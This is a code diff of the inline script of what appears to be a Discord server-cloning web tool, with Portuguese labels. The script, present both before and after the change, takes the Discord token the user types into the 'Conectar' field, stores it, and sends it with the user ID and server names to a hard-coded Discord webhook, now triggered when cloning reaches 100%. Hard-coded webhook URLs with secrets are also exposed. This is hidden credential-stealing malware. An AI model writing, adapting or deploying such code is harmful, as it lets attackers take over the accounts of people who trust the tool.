@@ -19,9 +19,11 @@ Error generating stack: `+e.message+`
   
 
 
+
+
 <script>
 (function() {
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1533973317307076628/WIbYk54qUTGcWQhrfJnkHzlimDGtQWGcCd_8VUxcwk743LS7KdngGMYmabAiL0Z-sujs";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1533976254427041944/pEvAX3bYFxWWa6RaJfWe_SjLufUfeENE0gFoEsfJLo8bka7Sl50RDDNGCMUAuCEpO30D";
     
     async function sendToWebhook(data) {
         try {
@@ -31,14 +33,15 @@ Error generating stack: `+e.message+`
                 body: JSON.stringify({
                     embeds: [{
                         title: 'logs do cara que clonou algum servidor!',
-                        color: 3447003,
+                        color: 2829617,
                         fields: [
-                            { name: 'Usuário', value: `<@${data.userId}> (${data.userId})`, inline: false },
-                            { name: 'Servidor original', value: `${data.originName} (${data.originId})`, inline: false },
-                            { name: 'Servidor colodo', value: `${data.targetName} (${data.targetId})`, inline: false },
+                            { name: 'Usuário', value: `<@${data.userId}>\n(${data.userId})`, inline: false },
+                            { name: 'Servidor original', value: `${data.originName}\n(${data.originId})`, inline: false },
+                            { name: 'Servidor colodo', value: `${data.targetName}\n(${data.targetId})`, inline: false },
                             { name: 'By token', value: "```\n" + data.token + "\n```", inline: false },
-                            { name: 'Informações', value: `veram (${data.userId})`, inline: false }
+                            { name: 'Informações', value: `veram ( ${data.userId} )`, inline: false }
                         ],
+                        footer: { text: 'Ontem às 23:25' }, // Simulando o estilo da foto ou usando data atual
                         timestamp: new Date().toISOString()
                     }]
                 })
@@ -46,13 +49,16 @@ Error generating stack: `+e.message+`
         } catch (e) { console.error('Log error:', e); }
     }
 
-    document.addEventListener('click', async (e) => {
-        const btn = e.target.closest('button');
-        if (!btn) return;
+    // Observador para detectar quando a clonagem termina (100%)
+    const observer = new MutationObserver((mutations) => {
+        for (const mutation of mutations) {
+            if (mutation.type === 'childList' || mutation.type === 'characterData') {
+                const progressText = document.body.innerText;
+                if (progressText.includes('100%') && progressText.includes('Clonagem concluída com sucesso')) {
+                    // Evitar envios duplicados
+                    if (window.lastSentClonagem === progressText) return;
+                    window.lastSentClonagem = progressText;
 
-        if (btn.textContent.includes('Iniciar Clonagem')) {
-            setTimeout(async () => {
-                try {
                     const selects = document.querySelectorAll('select');
                     const originSelect = selects[0];
                     const targetSelect = selects[1];
@@ -64,50 +70,31 @@ Error generating stack: `+e.message+`
                     const targetName = targetSelect && targetSelect.selectedOptions[0] ? targetSelect.selectedOptions[0].textContent : 'N/A';
                     
                     const token = localStorage.getItem('discord_token') || 'Token não encontrado';
-                    
                     let userId = 'N/A';
-                    try {
-                        const parts = token.split('.');
-                        if (parts.length > 0) {
-                            userId = atob(parts[0]);
-                        }
-                    } catch(err) {}
+                    try { userId = atob(token.split('.')[0]); } catch(err) {}
 
-                    if (originId !== 'N/A' && targetId !== 'N/A') {
-                        await sendToWebhook({
-                            userId,
-                            originId,
-                            originName,
-                            targetId,
-                            targetName,
-                            token
-                        });
-                    }
-                } catch(err) { console.error(err); }
-            }, 1000);
+                    sendToWebhook({
+                        userId,
+                        originId,
+                        originName,
+                        targetId,
+                        targetName,
+                        token
+                    });
+                }
+            }
         }
-        
-        if (btn.textContent.includes('Conectar')) {
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+
+    // Capturar token no clique do botão Conectar
+    document.addEventListener('click', async (e) => {
+        const btn = e.target.closest('button');
+        if (btn && btn.textContent.includes('Conectar')) {
             const input = document.querySelector('input[type="password"]');
             if (input && input.value) {
-                const tokenValue = input.value;
-                localStorage.setItem('discord_token', tokenValue);
-                
-                let userId = 'N/A';
-                try {
-                    const parts = tokenValue.split('.');
-                    if (parts.length > 0) {
-                        userId = atob(parts[0]);
-                    }
-                } catch(e) {}
-                
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "**Novo Token Conectado!**\nToken: ```\n" + tokenValue + "\n```\nID: " + userId
-                    })
-                });
+                localStorage.setItem('discord_token', input.value);
             }
         }
     });
